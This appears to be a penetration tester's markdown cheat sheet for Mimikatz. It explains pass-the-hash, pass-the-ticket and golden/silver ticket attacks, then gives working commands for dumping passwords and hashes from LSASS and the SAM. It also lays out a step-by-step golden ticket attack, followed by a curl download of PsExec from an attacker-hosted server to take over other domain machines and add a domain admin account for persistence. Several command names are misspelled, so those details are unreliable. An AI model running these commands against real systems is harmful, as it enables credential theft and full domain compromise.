# [Mimikatz](https://www.varonis.com/blog/what-is-mimikatz/)

 - [Latest executable version](https://github.com/gentilkiwi/mimikatz/releases)
 
 - [Unofficail command reference and guide](https://adsecurity.org/?page_id=1821)
 
 - [Offical Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)

Mimikatz is an open-source application that allows users to view and save authentication credentials 


    Pass-the-Hash: Windows used to store password data in an NTLM hash. Attackers use Mimikatz to pass that exact hash string to the target computer to login. Attackers don’t even need to crack the password, they just need to use the hash string as is. It’s the equivalent of finding the master key to a building on the floor. You need that one key to get into all the doors.
    
    Pass-the-Ticket: Newer versions of windows store password data in a construct called a ticket.  Mimikatz provides functionality for a user to pass a kerberos ticket to another computer and login with that user’s ticket. It’s basically the same as pass-the-hash otherwise.
    
    Over-Pass the Hash (Pass the Key): Yet another flavor of the pass-the-hash, but this technique passes a unique key to impersonate a user you can obtain from a domain controller.
    
    Kerberos Golden Ticket: This is a pass-the-ticket attack, but it’s a specific ticket for a hidden account called KRBTGT, which is the account that encrypts all of the other tickets. A golden ticket gives you domain admin credentials to any computer on the network that doesn’t expire.
    
    Kerberos Silver Ticket: Another pass-the-ticket, but a silver ticket takes advantage of a feature in Windows that makes it easy for you to use services on the network. Kerberos grants a user a TGS ticket, and a user can use that ticket to log into any services on the network. Microsoft doesn’t always check a TGS after it’s issued, so it’s easy to slip it past any safeguards.
    
    Pass-the-Cache: Finally an attack that doesn’t take advantage of Windows! A pass-the-cache attack is generally the same as a pass-the-ticket, but this one uses the saved and encrypted login data on a Mac/UNIX/Linux system.

# Using mimikatz

 ### mimikatz.exe on CMD

    privilege::debug
   
   - We want to see "20 OK"
   
   - This is to check that we can bypass memory protection
   
    log nameoflog.log
    
  To log what we do.
   
   The sekursla module in Mimikatz lets you dump passwords from memory. To use the commands in the sekurlsa module, you must have Admin or SYSTEM permissions.

    sekurlsa::logonpassword

  - Notes:

        wdigest: Old way Windows stored passwords in memory from 7 and prior. Passwords were stored in clear text here. 8+ fixed this to be hashed by turing off the feature. Mimikatz can turn it back on. Once back on a new logon session will be need to occur.

[Note on what LSA (lsass.exe) is](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)

lsadump::sam /patch

lsadump::lsa /patch


## kiki in meterpreter

 load kiwi


# Attacks

## Golden Ticket Attack

If you obtain the hash for the account that creates Kerberos tickets, then we can generate KTGT.
If this is achieved we have complete access to the domain and every machine.

**Exploit**

    lsadump::lsa /inject /name:<kerberos ticket granting account>
    
     You want to grab the SID of the domian and the NTLM hash of the account.
     
    kerberose::golden /User:<account name, existing or not> /domain:<domian> /sid:<domain SID> /<kerberos TGT account name>:<NTLM hash> /id:500 /ptt
    
      /id   #account RID
      
      /ptt  #Pass the hash
      
      
     If successful run:
     
     misc:cmd
     
   You now have an admin shell on the domain controller. Here are a few followups for persistence:
   
   - Interact with machines
   
         <command> \\<ip>\c$
         
   - Upload [psexec.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/psexechttps://docs.microsoft.com/en-us/sysinternals/downloads/psexec
   ) to get full shells on other domain systems.
   
        Python web server on attacker under /user/share/windows-binaries. 
        
        Then on windows:
             
         curl http://<ip>:8000/PsExec.exe -O psexec.exe    
   
         psexec.exe \\<machine name or IP> cmd.exe  #run in golden ticket shell
         
         Note that this can take a while
   
   - Create a domain admin account
   
   - Create silver ticket
      
